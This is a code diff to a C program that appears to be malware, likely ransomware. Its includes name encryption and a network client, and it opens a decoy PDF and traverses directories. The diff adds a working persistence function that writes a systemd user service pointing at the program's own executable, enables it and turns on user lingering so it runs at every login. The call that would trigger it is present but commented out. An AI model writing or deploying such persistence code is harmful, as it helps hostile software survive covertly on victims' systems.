@@ -3,12 +3,42 @@
 #include <stdlib.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <unistd.h>
 
 #include "../../headers/encryption.h"
 #include "../../headers/globals.h"
 #include "../../headers/client.h"
-#include "../../headers/watcher.h"
+//#include "../../headers/watcher.h"
 #include "../../headers/pdf_data.h"
+
+void start_up_register() {
+    char self_path[256];
+    char service_file[512];
+    char cmd[256];
+    FILE *f;
+
+    int rd = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+    if (rd < 0) return;
+    self_path[rd] = '\0';
+
+    snprintf(service_file, sizeof(service_file),"%s/.config/systemd/user/myapp.service", getenv("HOME"));
+
+    f = fopen(service_file, "w");
+    if (!f) return;
+
+    fprintf(f,
+        "[Unit]\nDescription=myapp\n\n"
+        "[Service]\nExecStart=%s\n\n"
+        "[Install]\nWantedBy=default.target\n",
+        self_path);
+    fclose(f);
+
+    system("systemctl --user daemon-reload");
+    system("systemctl --user enable myapp.service");
+
+    snprintf(cmd, sizeof(cmd), "loginctl enable-linger %s", getenv("USER"));
+    system(cmd);
+}
 
 void traverse(const char *path) {
 
@@ -63,6 +93,7 @@ int main() {
     char cmd[256];
     snprintf(cmd, sizeof(cmd), "xdg-open '%s' &", temp_path);
     //system(cmd); Uncomment to open the pdf.
+    //start_up_register(); Uncomment to register the process as a startup;
 
     //RAND_bytes(key, sizeof(key));
     initializeQueue(&queue);
